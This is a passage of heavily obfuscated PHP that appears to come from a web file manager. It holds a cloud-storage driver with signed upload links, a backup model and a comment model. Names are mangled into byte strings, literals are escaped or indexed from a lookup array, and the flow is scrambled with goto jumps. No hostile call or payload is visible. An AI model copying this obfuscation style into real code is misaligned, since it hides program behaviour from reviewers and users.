200) { $f†ùÖ÷°£å = $this->client->putObjectFile($eïß¥©§¶, $this->bucket, $FÔ±¤ˆå°è, $D²‡—áë›÷[189], $déõÑãåÑ, $cÕğµå‰ç§); return !empty($f†ùÖ÷°£å) ? $this->getPathOuter($FÔ±¤ˆå°è) : !1; } $A¼çéğ…Á = $this->client->multiUploadObject($eïß¥©§¶, $this->bucket, trim($FÔ±¤ˆå°è, $D²‡—áë›÷[8]), $déõÑãåÑ, $cÕğµå‰ç§); return $A¼çéğ…Á ? $this->getPathOuter($FÔ±¤ˆå°è) : !1; } public function download($BÕ‰¥‰±»­, $CƒÌóö˜Ù“) { if (!@is_dir($this->pathFather($CƒÌóö˜Ù“)) && !IO::mkdir($this->pathFather($CƒÌóö˜Ù“))) { return !1; } $Eåµ§»Òİ = $this->client->getObject($this->bucket, $BÕ‰¥‰±»­, array(), $CƒÌóö˜Ù“); return $Eåµ§»Òİ !== !1 ? $CƒÌóö˜Ù“ : !1; } public function link($Aš«ÇëÛ, $dïßŸí« = array()) { $Cï“¶Ğ±Ë =& $_SERVER[‡’¶øåüç˜]; if ($this->signVer == $Cï“¶Ğ±Ë[204]) { return $this->client->getAuthenticatedURL($this->bucket, $Aš«ÇëÛ, 3600 * 12, $dïßŸí«); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Aš«ÇëÛ, $Cï“¶Ğ±Ë[8]), 3600 * 12, $this->region, array(), !0, $dïßŸí«); } public function fileOut($c¢ìçŒ¦‡ë, $eÂÉ¨ = false, $B¿¶‚º½”Ü = false, $fšÚÜŒêÕß = '') { goto A‡õŒÀ‘õï; e±¬ÂÑØ’ã: $dîæÏÜÉå• = array($DĞèÙŸ“Ü[208] => $eÂÉ¨ . $DĞèÙŸ“Ü[209] . rawurlencode($B¿¶‚º½”Ü), $DĞèÙŸ“Ü[210] => $Eçƒ©ÒØÆ¸); $Eå£éâ¤• = $this->link($c¢ìçŒ¦‡ë, $dîæÏÜÉå•); $this->fileOutLink($Eå£éâ¤•); goto a¿Æ¦Ÿ‰Ş; A‡õŒÀ‘õï: $DĞèÙŸ“Ü =& $_SERVER[‡’¶øåüç˜]; if ($this->isFileOutServer()) { return $this->fileOutServer($c¢ìçŒ¦‡ë, $eÂÉ¨, $B¿¶‚º½”Ü, $fšÚÜŒêÕß); } if (!$B¿¶‚º½”Ü) { $B¿¶‚º½”Ü = $this->pathThis($c¢ìçŒ¦‡ë); } goto aõ¡ãçõ¾¢; aõ¡ãçõ¾¢: $Eçƒ©ÒØÆ¸ = get_file_mime(get_path_ext($B¿¶‚º½”Ü)); if ($Eçƒ©ÒØÆ¸ == $DĞèÙŸ“Ü[205]) { return parent::fileOut($c¢ìçŒ¦‡ë, $eÂÉ¨, $B¿¶‚º½”Ü, $fšÚÜŒêÕß); } $eÂÉ¨ = $eÂÉ¨ ? $DĞèÙŸ“Ü[206] : $DĞèÙŸ“Ü[207]; goto e±¬ÂÑØ’ã; a¿Æ¦Ÿ‰Ş: } public function fileOutServer($A†±ø‹ÉÉÛ, $c†ÑœèÛ…Ò = false, $A„íµóé­Š = false, $c£”Æˆˆ = '') { parent::fileOut($A†±ø‹ÉÉÛ, $c†ÑœèÛ…Ò, $A„íµóé­Š, $c£”Æˆˆ); } public function fileOutImageServer($cÙöï¶µÄ, $e‘‚˜ĞÖ‹ = 250) { parent::fileOutImage($cÙöï¶µÄ, $e‘‚˜ĞÖ‹); } public function hashMd5($E —î’ôÛ®, $f¼Ùªµö† = '') { $f•ÚÅÉ£ì¼ =& $_SERVER[‡’¶øåüç˜]; $FÕˆÁ”ñË = $this->objectMeta($E —î’ôÛ®); if (!$FÕˆÁ”ñË) { return !1; } $f¼Ùªµö† = $f¼Ùªµö† ? $f¼Ùªµö† : _get($FÕˆÁ”ñË, $f•ÚÅÉ£ì¼[211]); $f¼Ùªµö† = $f¼Ùªµö† ? $f¼Ùªµö† : _get($FÕˆÁ”ñË, $f•ÚÅÉ£ì¼[201], $f•ÚÅÉ£ì¼[33]); return $f¼Ùªµö†; } public function uploadFormData($d¢öœÚİé, $eİåÑªÃËŸ = 3600) { $B²…‚´Ú¼ =& $_SERVER[‡’¶øåüç˜]; $f‘‰Ê¿Õ¤ø = $this->pathFather($d¢öœÚİé); $e¦’ìÉÊª– = $this->client->getHttpUploadPostParams($this->bucket, $f‘‰Ê¿Õ¤ø, $B²…‚´Ú¼[189], $eİåÑªÃËŸ); return array_merge((array) $e¦’ìÉÊª–, array($B²…‚´Ú¼[173] => $this->getHost())); } public function multiUploadFormData($Aï§‚Ê’±¯, $aÉ†èÊ…É = 3600) { $fƒŠâ¶®å =& $_SERVER[‡’¶øåüç˜]; $bğÌÜ™áÎÎ = gmdate($fƒŠâ¶®å[212]); $a½Ë‚ÑÉ«§ = array(); $B’‘áÕÛ÷… = $this->client->getUploadId($this->bucket, $Aï§‚Ê’±¯, $a½Ë‚ÑÉ«§); if (!$B’‘áÕÛ÷…) { return !1; } return array($fƒŠâ¶®å[213] => $B’‘áÕÛ÷…, $fƒŠâ¶®å[173] => $this->getHost() . $fƒŠâ¶®å[8] . $this->pathEncode($Aï§‚Ê’±¯), $fƒŠâ¶®å[214] => $bğÌÜ™áÎÎ, $fƒŠâ¶®å[89] => $Aï§‚Ê’±¯); } public function multiUploadAuthData($BÓÏ·˜ğŒ, $bÚôŸ…§á³ = array()) { goto bÄå“¡˜œÖ; AòÀ¹‹: $Eš– ¿¼˜ = $bÚôŸ…§á³[$e–ù†ùõĞ[89]]; unset($bÚôŸ…§á³[$e–ù†ùõĞ[89]]); if (isset($bÚôŸ…§á³[$e–ù†ùõĞ[215]])) { $bÚôŸ…§á³[$e–ù†ùõĞ[214]] = $f•ŞÛÊ‰Û; return $this->listUploadParts($Eš– ¿¼˜, $bÚôŸ…§á³); } goto Fõåê«óÌ; bÄå“¡˜œÖ: $e–ù†ùõĞ =& $_SERVER[‡’¶øåüç˜]; $f•ŞÛÊ‰Û = isset($bÚôŸ…§á³[$e–ù†ùõĞ[214]]) ? $bÚôŸ…§á³[$e–ù†ùõĞ[214]] : gmdate($e–ù†ùõĞ[212]); $cË©ï†²› = isset($bÚôŸ…§á³[$e–ù†ùõĞ[165]]) ? $bÚôŸ…§á³[$e–ù†ùõĞ[165]] : $e–ù†ùõĞ[33]; goto AòÀ¹‹; BÜÇ¥ °: if (strpos($cË©ï†²›, $e–ù†ùõĞ[217]) === 0) { return array($e–ù†ùõĞ[224] => $bÃí½˜ªÃÑ, $e–ù†ùõĞ[214] => $f•ŞÛÊ‰Û); } return $bÃí½˜ªÃÑ; goto a‰ë’Ì¿“‹; Fõåê«óÌ: $dï¥ÎğèÒ„ = array($e–ù†ùõĞ[216], $e–ù†ùõĞ[33], $e–ù†ùõĞ[116], $e–ù†ùõĞ[33], "\170\x2d\x61\x6d\x7a\55\144\x61\164\145\72{$f•ŞÛÊ‰Û}", $e–ù†ùõĞ[8] . $this->bucket . $e–ù†ùõĞ[8] . $this->pathEncode($Eš– ¿¼˜) . $cË©ï†²›); if (strpos($cË©ï†²›, $e–ù†ùõĞ[217]) === 0) { $dï¥ÎğèÒ„[0] = $e–ù†ùõĞ[218]; } if (isset($bÚôŸ…§á³[$e–ù†ùõĞ[219]]) && $bÚôŸ…§á³[$e–ù†ùõĞ[219]] == $e–ù†ùõĞ[220]) { $dï¥ÎğèÒ„[0] = $e–ù†ùõĞ[220]; } goto C„é¼–ŞµÒ; C„é¼–ŞµÒ: $d’¼öÃ¦Î¥ = implode($e–ù†ùõĞ[221], $dï¥ÎğèÒ„); $E¥Ã¯é¿ÖÎ = base64_encode(hash_hmac($e–ù†ùõĞ[222], $d’¼öÃ¦Î¥, $this->secret, !0)); $bÃí½˜ªÃÑ = $e–ù†ùõĞ[223] . $this->accessKey . $e–ù†ùõĞ[4] . $E¥Ã¯é¿ÖÎ; goto BÜÇ¥ °; a‰ë’Ì¿“‹: } public function listUploadParts($b‚é¡ö‰íÑ, $a³¼›Çè = array()) { goto cŠ’ÛŸ…¤Ø; cŠ’ÛŸ…¤Ø: $eèŠ˜ïÖĞ =& $_SERVER[‡’¶øåüç˜]; $d£¼‰„æò = str_replace($eèŠ˜ïÖĞ[225], $eèŠ˜ïÖĞ[33], $a³¼›Çè[$eèŠ˜ïÖĞ[165]]); $fĞŠ²‹ïâœ = $this->client->listParts($this->bucket, $b‚é¡ö‰íÑ, $d£¼‰„æò); goto d×ŒäĞ°ÛÁ; d×ŒäĞ°ÛÁ: if (!$fĞŠ²‹ïâœ) { return !1; } unset($a³¼›Çè[$eèŠ˜ïÖĞ[215]], $a³¼›Çè[$eèŠ˜ïÖĞ[219]]); $a³¼›Çè[$eèŠ˜ïÖĞ[89]] = $b‚é¡ö‰íÑ; goto fÀê»£‚ÚÃ; fÀê»£‚ÚÃ: $e©•ëíÅ† = $this->multiUploadAuthData($b‚é¡ö‰íÑ, $a³¼›Çè); if (empty($e©•ëíÅ†)) { return !1; } return array($eèŠ˜ïÖĞ[224] => $e©•ëíÅ†, $eèŠ˜ïÖĞ[214] => $a³¼›Çè[$eèŠ˜ïÖĞ[214]], $eèŠ˜ïÖĞ[226] => $fĞŠ²‹ïâœ); goto E¸·ÑÀ£¸; E¸·ÑÀ£¸: } public function getHost() { return parent::getHost() . $_SERVER[‡’¶øåüç˜][8] . $this->bucket; } public function size($C˜•°÷—˜ª) { $f¾íá‘™‡ˆ = $this->objectMeta($C˜•°÷—˜ª); return $f¾íá‘™‡ˆ ? $f¾íá‘™‡ˆ[$_SERVER[‡’¶øåüç˜][77]] : 0; } public function info($dŒ·‡ÌÛ³í) { if ($this->isFolder($dŒ·‡ÌÛ³í)) { return $this->folderInfo($dŒ·‡ÌÛ³í); } else { if ($this->isFile($dŒ·‡ÌÛ³í)) { return $this->fileInfo($dŒ·‡ÌÛ³í); } } return !1; } public function exist($E¨ƒØÍˆÂõ) { return $this->isFile($E¨ƒØÍˆÂõ) || $this->isFolder($E¨ƒØÍˆÂõ); } public function isFile($dï¡…¿ŒÊ») { return !$this->isFolder($dï¡…¿ŒÊ») && $this->objectMeta($dï¡…¿ŒÊ»); } public function isFolder($BÁ¦…ÖÙê) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][227], $BÁ¦…ÖÙê); } protected function objectMeta($cêÈè°ƒ˜) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][228], $cêÈè°ƒ˜); } protected function _objectMeta($AÊĞµˆÕ«) { $cïš•àø³ó =& $_SERVER[‡’¶øåüç˜]; $AÊĞµˆÕ« = rtrim($AÊĞµˆÕ«, $cïš•àø³ó[8]); try { $BÔïñƒÙ®¤ = $this->client->getObjectInfo($this->bucket, $AÊĞµˆÕ«); if (!isset($BÔïñƒÙ®¤[$cïš•àø³ó[211]]) && isset($BÔïñƒÙ®¤[$cïš•àø³ó[229]])) { $BÔïñƒÙ®¤[$cïš•àø³ó[211]] = $BÔïñƒÙ®¤[$cïš•àø³ó[229]]; } } catch (Exception $C‰¾…¡¸™) { $BÔïñƒÙ®¤ = !1; } if (!$BÔïñƒÙ®¤) { } return $BÔïñƒÙ®¤; } protected function _isFolder($a†¸î´†) { goto cŒÆŒÒÊæ¾; A·¯‰¨Ã¦: if (substr($fˆåøÁãõ½[0][$BÇîø—ê¿Ğ[28]], -1) == $BÇîø—ê¿Ğ[8]) { return !0; } if (get_path_this($fˆåøÁãõ½[0][$BÇîø—ê¿Ğ[28]]) == get_path_this($a†¸î´†)) { return !1; } return !0; goto e±¥³Ÿ½Õê; cŒÆŒÒÊæ¾: $BÇîø—ê¿Ğ =& $_SERVER[‡’¶øåüç˜]; $a†¸î´† = rtrim($a†¸î´†, $BÇîø—ê¿Ğ[8]); if ($a†¸î´† == $BÇîø—ê¿Ğ[33] || $a†¸î´† == $BÇîø—ê¿Ğ[8]) { return !0; } goto eÎˆÍßÕ£‹; eÎˆÍßÕ£‹: $fˆåøÁãõ½ = $this->client->getBucket($this->bucket, $a†¸î´†, null, 1); if (empty($fˆåøÁãõ½)) { return !1; } $fˆåøÁãõ½ = array_values($fˆåøÁãõ½); goto A·¯‰¨Ã¦; e±¥³Ÿ½Õê: } } define($_SERVER[‡’¶øåüç˜][230], 1); goto cÓ¶ïæÆ˜Ø; C°ø»˜É: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\142\x61\143\x6b\165\160\114\151\x73\x74"; public $field = array("\x69\157", "\x6e\141\x6d\x65", "\163\x74\141\x74\165\x73", "\143\157\156\x74\x65\156\x74", "\162\x65\163\x75\x6c\x74", "\164\151\155\145\x46\162\x6f\155", "\x74\151\x6d\x65\124\x6f"); public function config() { goto BŠ‹›Àº©Ò; fÆá¿ƒº¿ã: if (isset($A…ù±Ç›÷ô[$AºÃ…ƒ¦Œ[194]])) { $A…ù±Ç›÷ô[$AºÃ…ƒ¦Œ[194]] = json_decode($A…ù±Ç›÷ô[$AºÃ…ƒ¦Œ[194]], !0); } if (isset($E›ù£¸„¢ğ[$AºÃ…ƒ¦Œ[194]])) { $A…ù±Ç›÷ô[$AºÃ…ƒ¦Œ[194]][$AºÃ…ƒ¦Œ[1418]] = $E›ù£¸„¢ğ[$AºÃ…ƒ¦Œ[194]]; unset($E›ù£¸„¢ğ[$AºÃ…ƒ¦Œ[194]]); } return array_merge($A…ù±Ç›÷ô, $E›ù£¸„¢ğ); goto fõæõĞéíÉ; BŠ‹›Àº©Ò: $AºÃ…ƒ¦Œ =& $_SERVER[‡’¶øåüç˜]; $E›ù£¸„¢ğ = Model($AºÃ…ƒ¦Œ[1095])->get($AºÃ…ƒ¦Œ[719]); $E›ù£¸„¢ğ = json_decode($E›ù£¸„¢ğ, !0); goto f‘š¼ãï“è; f‘š¼ãï“è: $E›ù£¸„¢ğ = is_array($E›ù£¸„¢ğ) ? $E›ù£¸„¢ğ : array(); if (!isset($E›ù£¸„¢ğ[$AºÃ…ƒ¦Œ[698]])) { $E›ù£¸„¢ğ[$AºÃ…ƒ¦Œ[698]] = $AºÃ…ƒ¦Œ[83]; } $A…ù±Ç›÷ô = array(); goto a”õ¸§¢†™; a”õ¸§¢†™: Action($AºÃ…ƒ¦Œ[2135])->taskInit(); $eœ¶ƒŠ¹Š = Model($AºÃ…ƒ¦Œ[2136])->listData(); foreach ($eœ¶ƒŠ¹Š as $D•¥‹´¹ô«) { if ($D•¥‹´¹ô«[$AºÃ…ƒ¦Œ[1087]] == $AºÃ…ƒ¦Œ[83] && $D•¥‹´¹ô«[$AºÃ…ƒ¦Œ[1431]] == $AºÃ…ƒ¦Œ[2137]) { $A…ù±Ç›÷ô = $D•¥‹´¹ô«; break; } } goto fÆá¿ƒº¿ã; fõæõĞéíÉ: } public function listData($bæÍÛ·‹ó = false, $eŞÖ­Äâò¼ = "\155\157\144\x69\146\171\124\151\x6d\145", $aĞæè‰ïŞ™ = false) { return parent::listData($bæÍÛ·‹ó, $eŞÖ­Äâò¼, !0); } public function lastItem() { $EÃÃÒ¡ÉË = $this->listData(); return !empty($EÃÃÒ¡ÉË[0]) ? $EÃÃÒ¡ÉË[0] : null; } public function kill($Aİ½£±ö×Š) { goto eñšÛ˜»æÏ; fõù¶Şß¤: return $this->remove($Aİ½£±ö×Š); goto B¸ÈåÀ –; eñšÛ˜»æÏ: $b»”¸«­Ã´ =& $_SERVER[‡’¶øåüç˜]; $e¢×»ª— = $this->listData($Aİ½£±ö×Š); if (!$e¢×»ª— || empty($e¢×»ª—[$b»”¸«­Ã´[28]])) { return !0; } goto B¥Ü¹¿¸Çù; DÇ‹‰”î§´: $fšŒÜ²Ó­¡ = $e¢×»ª—[$b»”¸«­Ã´[28]]; $FÔÇâ´Ş•Ø = TEMP_FILES . $b»”¸«­Ã´[715] . $fšŒÜ²Ó­¡ . $b»”¸«­Ã´[8]; IO::remove($FÔÇâ´Ş•Ø, !1); goto fõù¶Şß¤; B¥Ü¹¿¸Çù: Task::kill($b»”¸«­Ã´[718]); Task::kill($b»”¸«­Ã´[734]); Task::kill($b»”¸«­Ã´[742]); goto DÇ‹‰”î§´; B¸ÈåÀ –: } public function remove($FÜá÷¶¥å) { $cŸ­Å¸âòŒ = $this->listData($FÜá÷¶¥å); if (!$cŸ­Å¸âòŒ) { return !0; } return $this->backupRemove($cŸ­Å¸âòŒ); } private function backupRemove($d¡¢øŞÔÇè) { $dæî»¬øã¤ =& $_SERVER[‡’¶øåüç˜]; parent::remove($d¡¢øŞÔÇè[$dæî»¬øã¤[371]]); $A¤Ğïôğ = "\x7b\x69\157\72{$d¡¢øŞÔÇè[$dæî»¬øã¤[697]]}\x7d\57\x64\x61\x74\141\142\x61\163\x65\x2f\x62\x61\143\153\x75\160\x5f" . $d¡¢øŞÔÇè[$dæî»¬øã¤[28]]; IO::remove($A¤Ğïôğ, !1); return !0; } public function start() { goto AŒä¾È¶İ‚; AŒä¾È¶İ‚: $Bœ‹µª´Ü· =& $_SERVER[‡’¶øåüç˜]; if ($GLOBALS[$Bœ‹µª´Ü·[6]][$Bœ‹µª´Ü·[84]][$Bœ‹µª´Ü·[2138]] != $Bœ‹µª´Ü·[83]) { return !0; } $E¨•¦ÃÆò½ = $this->config(); goto cÜÎÁ±­±‰; aÚçô¥ßÔƒ: return !0; goto D±ˆ‚ßÊ; cÜÎÁ±­±‰: if (!$E¨•¦ÃÆò½ || $E¨•¦ÃÆò½[$Bœ‹µª´Ü·[1415]] != $Bœ‹µª´Ü·[83]) { return !1; } $CïŞìœËà = $this->process(); foreach ($CïŞìœËà as $BÈ ¡‘£—‡) { if ($BÈ ¡‘£—‡) { return Task::restart($BÈ ¡‘£—‡[$Bœ‹µª´Ü·[371]]); } } goto D¤ŒÈ¯óĞÍ; D¤ŒÈ¯óĞÍ: $BåªùëÂë™ = new Backup(); $BåªùëÂë™->keep(); if (!$BåªùëÂë™->db()) { return !1; } goto CšÄ«¿ò²Ç; CšÄ«¿ò²Ç: if (!$BåªùëÂë™->dbFile()) { return !1; } if ($E¨•¦ÃÆò½[$Bœ‹µª´Ü·[698]] == $Bœ‹µª´Ü·[481]) { $BåªùëÂë™->file(); } Backup::set(array($Bœ‹µª´Ü·[695] => 1, $Bœ‹µª´Ü·[460] => time())); goto aÚçô¥ßÔƒ; D±ˆ‚ßÊ: } public function process() { $Bµƒëò·‚Ï =& $_SERVER[‡’¶øåüç˜]; return array($Bµƒëò·‚Ï[700] => Task::get($Bµƒëò·‚Ï[718]), $Bµƒëò·‚Ï[703] => Task::get($Bµƒëò·‚Ï[734]), $Bµƒëò·‚Ï[171] => Task::get($Bµƒëò·‚Ï[742])); } public function restore() { $f£¤”ÏÂ«¿ =& $_SERVER[‡’¶øåüç˜]; ActionCall($f£¤”ÏÂ«¿[977], !0, 1); ActionCall($f£¤”ÏÂ«¿[977], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\x6d\145" => "\x63\157\155\x6d\x65\156\164\x5f\155\145\x74\141", "\x6d\145\x74\141\106\x69\x65\154\144" => "\x63\x6f\x6d\x6d\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($A„Ò èµ‚) { $DÍåŸ³»—Ì =& $_SERVER[‡’¶øåüç˜]; if ($A„Ò èµ‚[$DÍåŸ³»—Ì[2139]]) { $eœ½åÑùÌ„ = $this->where(array($DÍåŸ³»—Ì[2140] => $A„Ò èµ‚[$DÍåŸ³»—Ì[2139]]))->find(); if (!$eœ½åÑùÌ„ || $eœ½åÑùÌ„[$DÍåŸ³»—Ì[383]] != $A„Ò èµ‚[$DÍåŸ³»—Ì[383]] || $eœ½åÑùÌ„[$DÍåŸ³»—Ì[469]] != $A„Ò èµ‚[$DÍåŸ³»—Ì[469]]) { return !1; } $this->where(array($DÍåŸ³»—Ì[2140] => $A„Ò èµ‚[$DÍåŸ³»—Ì[2139]]))->setAdd($DÍåŸ³»—Ì[2141], 1); } $A„Ò èµ‚[$DÍåŸ³»—Ì[2142]] = 0; $A„Ò èµ‚[$DÍåŸ³»—Ì[2141]] = 0; $A„Ò èµ‚[$DÍåŸ³»—Ì[695]] = 1; return $this->add($A„Ò èµ‚); } public function remove($a ÜŞ§ŞÀ‰) { $fÍ°Î„×¥ =& $_SERVER[‡’¶øåüç˜]; $B›³¿îøõ¥ = array($fÍ°Î„×¥[2140] => $a ÜŞ§ŞÀ‰); $F¢‹çÁ´¬ = $this->where($B›³¿îøõ¥)->find(); if ($F¢‹çÁ´¬[$fÍ°Î„×¥[2139]]) { $this->where(array($fÍ°Î„×¥[2140] => $F¢‹çÁ´¬[$fÍ°Î„×¥[2139]]))->setAdd($fÍ°Î„×¥[2141], -1); } return $this->where($B›³¿îøõ¥)->delete(); } public function edit($b“‘ÀİµÓ¤, $B¸À«İàÊƒ) { $dßÚ§÷§šŒ =& $_SERVER[‡’¶øåüç˜]; $Cô¥ŞÛ˜‚ê = array($dßÚ§÷§šŒ[2140] => $b“‘ÀİµÓ¤); return $this->where($Cô¥ŞÛ˜‚ê)->save(array($dßÚ§÷§šŒ[2143] => $B¸À«İàÊƒ)); } public function prasise($A†Å—ø²”¶) { $B­«ÏçíÔÔ =& $_SERVER[‡’¶øåüç˜]; $fè÷«ÑÃ¶Æ = Model($B­«ÏçíÔÔ[2144]); $E‰æ‰íµÒ = array($B­«ÏçíÔÔ[2140] => $A†Å—ø²”¶, $B­«ÏçíÔÔ[1434] => USER_ID); $D‘êëëäöó = $fè÷«ÑÃ¶Æ->where($E‰æ‰íµÒ)->find(); if (!$D‘êëëäöó) { $fè÷«ÑÃ¶Æ->add($E‰æ‰íµÒ); $Aî¬¦½¿Í = $this->where(array($B­«ÏçíÔÔ[2140] => $A†Å—ø²”¶))->setAdd($B­«ÏçíÔÔ[2142], 1); } else { $fè÷«ÑÃ¶Æ->where($E‰æ‰íµÒ)->delete(); $Aî¬¦½¿Í = $this->where(array($B­«ÏçíÔÔ[2140] => $A†Å—ø²”¶))->setAdd($B­«ÏçíÔÔ[2142], -1); } return $Aî¬¦½¿Í; } public function targetInfo($bù‘„ø©Í›, $e‘³î«†˜) { goto AÁ™¡İ®ª¦; eÇóÍƒÊº: $E‘ìÜ‡ Ì‹ = "\122\x49\x47\110\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\155\x6d\145\x6e\164\137\x70\x72\141\151\x73\145\40\x73\x74\141\162\40\x6f\x6e\40\x63\157\155\x6d\145\x6e\x74\x2e\143\x6f\155\x6d\145\x6e\164\x49\x44\x20\75\x20\163\164\141\162\x2e\143\x6f\x6d\x6d\145\156\x74\111\104"; $BîÁç¤ŸÄ¬ = $this->alias($D³Ö¦„øĞ¢[345])->where($Fò×§Òô)->join($E‘ìÜ‡ Ì‹, $D³Ö¦„øĞ¢[2145])->count(); $CÚñ’¾‘º™ = array($D³Ö¦„øĞ¢[2146] => $DÂˆÇãœÀÏ, $D³Ö¦„øĞ¢[2147] => $BîÁç¤ŸÄ¬); goto b¼ëä¢Ïôã; b¼ëä¢Ïôã: return $CÚñ’¾‘º™; goto e…ª™Õ¡¥; AÁ™¡İ®ª¦: $D³Ö¦„øĞ¢ =& $_SERVER[‡’¶øåüç˜]; $Fò×§Òô = array($D³Ö¦„øĞ¢[534] => $bù‘„ø©Í›, $D³Ö¦„øĞ¢[535] => $e‘³î«†˜); $DÂˆÇãœÀÏ = $this->where($Fò×§Òô)->count(); goto eÇóÍƒÊº; e…ª™Õ¡¥: } public function listData($d¾ôÑ²­ŞÃ) { $C“È¯Œİé =& $_SERVER[‡’¶øåüç˜]; if (isset($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2148]])) { if ($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2148]]) { $d¾ôÑ²­ŞÃ[$C“È¯Œİé[2149]] = array($C“È¯Œİé[931], intval($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2148]])); } unset($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2148]]); } if (isset($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2150]])) { if ($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2150]]) { $d¾ôÑ²­ŞÃ[$C“È¯Œİé[2149]] = array($C“È¯Œİé[928], intval($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2150]])); } unset($d¾ôÑ²­ŞÃ[$C“È¯Œİé[2150]]); } return $this->_listData($d¾ôÑ²­ŞÃ); } private function _listData($Eğ‡‘ìŠà) { $F¿‘‚·¿ïÌ =& $_SERVER[‡’¶øåüç˜]; $BõÎ¶ØÙØ„ = $this->where($Eğ‡‘ìŠà)->_makeOrder()->selectPage(100); $this->_listAppendParent($BõÎ¶ØÙØ„[$F¿‘‚·¿ïÌ[358]]); $this->_listAppendUser($BõÎ¶ØÙØ„[$F¿‘‚·¿ïÌ[358]]); $this->_listAppendMeta($BõÎ¶ØÙØ„[$F¿‘‚·¿ïÌ[358]]); return $BõÎ¶ØÙØ„; } private function _makeOrder() { $F³‰ù¡óŸé =& $_SERVER[‡’¶øåüç˜]; $a–á¯•Ú = array($F³‰ù¡óŸé[2142], $F³‰ù¡óŸé[2141], $F³‰ù¡óŸé[191]); $c«­ŠÚÅ™ = Input::get($F³‰ù¡óŸé[419], $F³‰ù¡óŸé[7], $F³‰ù¡óŸé[401], $a–á¯•Ú); $cŸì±Ò‘ï = Input::get($F³‰ù¡óŸé[420], $F³‰ù¡óŸé[7], $F³‰ù¡óŸé[1436], array($F³‰ù¡óŸé[2151], $F³‰ù¡óŸé[417])); $A±”³§ÓìØ = $c«­ŠÚÅ™ . $F³‰ù¡óŸé[50] . $cŸì±Ò‘ï; return $this->order($A±”³§ÓìØ); } private function _listAppendParent(&$bÂòİ»ˆ„Ñ) { goto E³©Ø…íó; eˆ¯œ¡ñÍ›: foreach ($bÂòİ»ˆ„Ñ as &$cá¤”¶…÷ä) { if (isset($a¥‚¥ŸÏà¶[$cá¤”¶…÷ä[$a„ İìÚÖ¯[2139]]])) { $cá¤”¶…÷ä[$a„ İìÚÖ¯[2152]] = $a¥‚¥ŸÏà¶[$cá¤”¶…÷ä[$a„ İìÚÖ¯[2139]]]; } } unset($cá¤”¶…÷ä); goto f”Ô¦Ù‘‚—; E³©Ø…íó: $a„ İìÚÖ¯ =& $_SERVER[‡’¶øåüç˜]; $e„Š¿Ï¿£« = array_unique(array_to_keyvalue($bÂòİ»ˆ„Ñ, $a„ İìÚÖ¯[33], $a„ İìÚÖ¯[2139])); $e„Š¿Ï¿£« = array_remove_value($e„Š¿Ï¿£«, $a„ İìÚÖ¯[481]); goto c•È¬Œíˆ÷; c•È¬Œíˆ÷: if (!$e„Š¿Ï¿£«) { return; } $a¥‚¥ŸÏà¶ = $this->where(array($a„ İìÚÖ¯[2140] => array($a„ İìÚÖ¯[7], $e„Š¿Ï¿£«)))->select(); $a¥‚¥ŸÏà¶ = array_to_keyvalue($a¥‚¥ŸÏà¶, $a„ İìÚÖ¯[2149]); goto eˆ¯œ¡ñÍ›; f”Ô¦Ù‘‚—: } private function _listAppendUser(&$e¾Ú˜Ñš‘Ù) { goto f¶ÄÌ‰´Åó; f¶ÄÌ‰´Åó: $DÍ³Ó“­÷· =& $_SERVER[‡’¶øåüç˜]; $E®õ¼öØìì = array_unique(array_to_keyvalue($e¾Ú˜Ñš‘Ù, $DÍ³Ó“­÷·[33], $DÍ³Ó“­÷·[1443])); $E®õ¼öØìì = array_remove_value($E®õ¼öØìì, $DÍ³Ó“­÷·[481]); goto aˆã¹ç˜¸µ; aˆã¹ç˜¸µ: if (count($E®õ¼öØìì) == 0) { return; } foreach ($e¾Ú˜Ñš‘Ù as $dØ™±“…¢‡) { if (isset($dØ™±“…¢‡[$DÍ³Ó“­÷·[2152]])) { $E®õ¼öØìì[] = $dØ™±“…¢‡[$DÍ³Ó“­÷·[2152]][$DÍ³Ó“­÷·[1443]]; } } $FÅƒ ÒÚäÍ = Model($DÍ³Ó“­÷·[490])->userListInfo($E®õ¼öØìì); goto CÜóÆ¥à–¦; CÜóÆ¥à–¦: foreach ($e¾Ú˜Ñš‘Ù as &$dØ™±“…¢‡) { $dØ™±“…¢‡[$DÍ³Ó“­÷·[547]] = $FÅƒ ÒÚäÍ[$dØ™±“…¢‡[$DÍ³Ó“­÷·[1443]]]; if (isset($dØ™±“…¢‡[$DÍ³Ó“­÷·[2152]])) { $dØ™±“…¢‡[$DÍ³Ó“­÷·[2152]][$DÍ³Ó“­÷·[547]] = $FÅƒ ÒÚäÍ[$dØ™±“…¢‡[$DÍ³Ó“­÷·[2152]][$DÍ³Ó“­÷·[1443]]]; } } unset($dØ™±“…¢‡); goto eÑ·Ÿì¦Àƒ; eÑ·Ÿì¦Àƒ: } private function _listAppendMeta(&$eˆí˜ Ï³®) { goto AÏÎïß©Ô; dÀà¼¦“»‡: if (!$b˜êæå†ŸÙ) { return !1; } foreach ($eˆí˜ Ï³® as &$fÑà×ÒÉ½Ò) { $fÑà×ÒÉ½Ò[$cÚ…šÓ³•Õ[429]] = $b˜êæå†ŸÙ[$fÑà×ÒÉ½Ò[$cÚ…šÓ³•Õ[2149]]]; if (isset($fÑà×ÒÉ½Ò[$cÚ…šÓ³•Õ[2152]])) { $fÑà×ÒÉ½Ò[$cÚ…šÓ³•Õ[2152]][$cÚ…šÓ³•Õ[429]] = 